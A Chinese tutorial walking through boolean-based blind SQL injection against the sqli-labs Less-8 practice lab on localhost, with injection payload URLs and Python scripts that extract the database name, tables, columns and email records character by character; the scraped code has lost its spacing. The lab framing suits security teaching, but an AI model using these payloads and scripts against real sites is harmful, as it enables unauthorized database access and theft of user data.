http://www.jb51.net/article/93445.htm

**基于布尔的盲注**

Web的页面的仅仅会返回True和False。那么布尔盲注就是进行SQL注入之后然后根据页面返回的True或者是False来得到数据库中的相关信息。

由于本次是布尔注入，手注无法完整地进行脱裤。所以在本节需要编写大量的代码来帮助我们进行SQL注入，得到数据。所以在这章里面会有很多的Python代码。

本次的示例就是Less-8。

通过进行下面的语句的注入测试

```
http://localhost/sqlilabs/Less-8/?id=2'
http://localhost/sqlilabs/Less-8/?id=2"
http://localhost/sqlilabs/Less-8/?id=2\
```

进行测试的时候，只有在`id=2'`的时候页面无法显示内容。输入的语句如果符合要求，页面就会显示内容，但是显示的内容都是一样的。这种情况下页面上的输出对于我们来说是完全没有用的，包括SQL执行出错的信息都不会在页面上显示。这种情况下之前的通过执行SQL语句然后在页面上显示SQL执行之后返回的信息完全是不可能的啦。这种情况下就是一个典型的SQL盲注了。

我们通过页面是否显示内容来判断我们的SQL语句是否正确，进而猜解数据库的信息。  


通过上面的注入测试，我们知道后台的SQL的注入语句的写法是:

```
select field from table where id='userinput'
```

id参数是被单引号包括的。其他的信息我们就无法得到了。

**得到数据库的名称**

在得到数据库的名称之前，首先需要得到数据库的长度

[?](http://www.jb51.net/article/93445.htm#)

| 1234 | [`http://localhost/sqlilabs/Less-8/?id=2`](http://localhost/sqlilabs/Less-8/?id=2)`' and length(database())>1 %23`[`http://localhost/sqlilabs/Less-8/?id=2`](http://localhost/sqlilabs/Less-8/?id=2)`'andlength(database())>2 %23以此类推.....` |
| :--- | :--- |


发现当值为8的时候，页面就没有显示。那么说明`database()`的长度是8。  


得到了`datbase()`的长度之后，接下来就是得到`database()`的名称了。

这个时候就不能完全靠手注了，必须编写Python代码来完成。其中最主要就是进行大量的注入测试来判断程序执行正确和出错的时机，然后断定当前的值可能就是正确的值。  


下面就是一个简单的使用Python来进行布尔盲注获取数据的代码。

[?](http://www.jb51.net/article/93445.htm#)

| 123456789101112131415 | `defget_db_name():result=""url_template="`[`http://localhost/sqlilabs/Less-8/?id=2`](http://localhost/sqlilabs/Less-8/?id=2)`' and ascii(substr(database(),{0},1))>{1} %23"chars='0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'foriinrange(1,9):forcharinchars:char_ascii=ord(char)url=url_template.format(i,char_ascii)response=requests.get(url)length=len(response.text)#返回的长度只有706和722iflength>706:result+=charbreakprint(result)` |
| :--- | :--- |


得到最后的结果的是security，是正确的。

**得到数据库中的表信息**

其实所有的SQL注入步骤都是类似的。首先得到数据库的名称\(这一步不是必须的\)，然后得到当前数据库的表名称，然后得到表的字段，最后进行脱裤。这个步骤在[前一章](http://www.jb51.net/article/93442.htm)已经有说明了。  


首先看一个简单的SQL盲注获取数据库表信息的写法。

[?](http://www.jb51.net/article/93445.htm#)

| 1 | [`http://localhost/sqlilabs/Less-8/?id=2`](http://localhost/sqlilabs/Less-8/?id=2)`'andascii(substr((selecttable_namefrominformation_schema.tableswheretable_schema=database() limit 0,1),1,1))>60 %23` |
| :--- | :--- |


其实还是使用之前的`select table_name from information_schema.tables where table_schema=database() limit 0,1`这样的语句来得到表的信息，但是现在是无法在页面上显示的，而是通过盲注来一个字符一个字符的获取表名。  


接下也同样是通过编写Python代码来获取表名了。代码也和上面的类似。主要就是修改中的URl。在进行Python获取表名之前，我们同样需要知道表名的长度。

使用如下的语句就可以得到了。  


获取表名的SQL注入的写法就是如下

[?](http://www.jb51.net/article/93445.htm#)

| 1 | [`http://localhost/sqlilabs/Less-8/?id=2`](http://localhost/sqlilabs/Less-8/?id=2)`'and(selectlength(table_name)frominformation_schema.tableswheretable_schema=database() limit 0,1)>0 %23` |
| :--- | :--- |


通过这种方式我们知道数据库表中的第一个表名的长度是6。知道了表名的长度之后，接下来的Python脚本就很好写了。

[?](http://www.jb51.net/article/93445.htm#)

| 123456789101112131415 | `defget_table_name():result=""url_template="`[`http://localhost/sqlilabs/Less-8/?id=2`](http://localhost/sqlilabs/Less-8/?id=2)`' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),{0},1))>{1} %23"chars='0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'foriinrange(1,7):forcharinchars:char_ascii=ord(char)url=url_template.format(i,char_ascii)response=requests.get(url)length=len(response.text)#返回的长度只有706和722iflength>706:result+=charbreakprint(result)` |
| :--- | :--- |


最后得到了第一个表名是emails,如果要得到其他的表名只需要将代码`limit 0,1`修改成为`limit 1,1`或者是其他的就可以了。

**得到表名的列信息**

在得到列名之前，同样需要知道在表中的字段长度。例如我们想要知道在emails表中的长度，那么就可以使用如下的语句来获取。

[?](http://www.jb51.net/article/93445.htm#)

| 1 | [`http://localhost/sqlilabs/Less-8/?id=2`](http://localhost/sqlilabs/Less-8/?id=2)`'and(selectlength(column_name)frominformation_schema.columnswheretable_name=0x656d61696c73 limit 0,1)>【num】 %23` |
| :--- | :--- |


修改num的值即可，从0开始一直到到程序出错。通过这种方法，我们得到在emails中存在2个字段，字段的长度分别是2，8。  
得到了字段长度之后，接下来就是进行布尔注入得到字段名称了。  


在编写代码之前，还是来看如何写获取字段名称的sql语句吧。下面这个代码就是用来获取字段名称的代码。

[?](http://www.jb51.net/article/93445.htm#)

| 1 | [`http://localhost/sqlilabs/Less-8/?id=2`](http://localhost/sqlilabs/Less-8/?id=2)`'andascii(substr((selectcolumn_namefrominformation_schema.columnswheretable_name=0x656d61696c73 limit 0,1),1,1))>60 %23` |
| :--- | :--- |


我们编写的Python代码也是利用上面这个代码来获取字段名称。

[?](http://www.jb51.net/article/93445.htm#)

| 123456789101112131415 | `defget_column_name():result=""url_template="`[`http://localhost/sqlilabs/Less-8/?id=2`](http://localhost/sqlilabs/Less-8/?id=2)`' and ascii(substr((select column_name from information_schema.columns where table_name=0x656d61696c73 limit 0,1),{0},1))>{1} %23"chars='0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz'foriinrange(1,3):forcharinchars:char_ascii=ord(char)url=url_template.format(i,char_ascii)response=requests.get(url)length=len(response.text)#返回的长度只有706和722iflength>706:result+=charbreakprint(result)` |
| :--- | :--- |


通过上面这个代码，我们可以得到在emails表中存在的字段名称分别是`id`和`email_id`

**脱裤**

在得到了字段名称之后，接下来最重要的一步就是进行脱裤了。  
在进行脱裤之前，我们首先判断在emails表中有多少条记录。

使用的语句如下：

[?](http://www.jb51.net/article/93445.htm#)

| 1 | [`http://localhost/sqlilabs/Less-8/?id=2`](http://localhost/sqlilabs/Less-8/?id=2)`'and(selectcount(*)fromemails)>0 %23` |
| :--- | :--- |


修改&gt;0中的0依次为1，2，3之后，我们得到在emails表中一共存在8条记录。  


那么接下来就是进行脱裤了。  


在脱裤之前，我们首先要知道当前记录的长度，这个SQL语句也很好写。

[?](http://www.jb51.net/article/93445.htm#)

| 1 | [`http://localhost/sqlilabs/Less-8/?id=2`](http://localhost/sqlilabs/Less-8/?id=2)`'and(selectlength(email_id)fromemails limit 0,1)>15 %23` |
| :--- | :--- |


最后我们知道在emails表中的第一条记录中的`email_id`的长度是16.  


知道了长度之后，代码就很好写了。

[?](http://www.jb51.net/article/93445.htm#)

| 123456789101112131415 | `defget_data():result=""url_template="`[`http://localhost/sqlilabs/Less-8/?id=2`](http://localhost/sqlilabs/Less-8/?id=2)`' and ascii(substr((select email_id from emails limit 0,1),{0},1))>{1} %23"chars='.0123456789@ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz'foriinrange(1,17):forcharinchars:char_ascii=ord(char)url=url_template.format(i,char_ascii)response=requests.get(url)length=len(response.text)#返回的长度只有706和722iflength>706:result+=charbreakprint(result)` |
| :--- | :--- |


通过上面的这段代码就得到了内容是Dumb@dhakkan.com,其他的内容就同样通过这段方式得到数据了。这里就不作演示了。

**总结**

其实基于布尔盲注和基于时间的盲注都是需要编写大量的代码，就像本篇的文章一样。之前在简单的SQL注入中，一句SQL注入代码就可以解决的问题在这里就需要编写Python代码来进行大量的注入测试才能够得到内容。其实之前我也很少完整的用Python来编写SQL注入代码完成整个布尔盲注的注入过程。通过本章的编写，熟悉了使用Python代码完整地进行一次布尔盲注的过程了，学习了很多。以上就是这篇文章的全部内容了，希望对大家能有所帮助。

